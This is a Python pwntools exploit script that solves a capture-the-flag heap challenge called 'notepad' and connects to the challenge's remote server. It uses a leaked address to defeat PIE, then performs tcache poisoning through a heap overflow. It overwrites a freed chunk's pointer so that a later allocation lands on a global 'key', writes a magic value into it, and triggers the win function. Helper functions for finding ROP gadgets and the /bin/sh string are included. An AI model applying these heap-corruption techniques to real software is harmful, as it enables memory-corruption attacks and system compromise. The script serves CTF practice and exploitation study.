from pwn import *
from icecream import ic

elf = exe = ELF("./notepad_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("notepad.ctf.intigriti.io", 1341)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

def alloc(ind, size, data):
    sla(">", "1")
    sla(">", str(ind))
    sla(">", str(size))
    sla(">", data)

def view(ind):
    sla(">", "2")
    sla(">", str(ind))

def edit(ind, data):
    sla(">", "3")
    sla(">", str(ind))
    sla(">", data)

def free(ind):
    sla(">", "4")
    sla(">", str(ind))

def win():
    sla(">", "5")

ru("Here a gift: ")
elf.address = int(rl().strip(), 16) - elf.sym.main
ic(hex(elf.address))

alloc(0, 30, b'a'*0x10)
alloc(1, 30, b'a'*0x10)
alloc(2, 30, b'a'*0x10)
free(1)
edit(0, b'a'*0x28 + p64(0x31) + p64(elf.sym['key']))
alloc(3, 30, b'a'*0x10)
alloc(4, 30, p64(0xcafebabe))
win()


io.interactive()
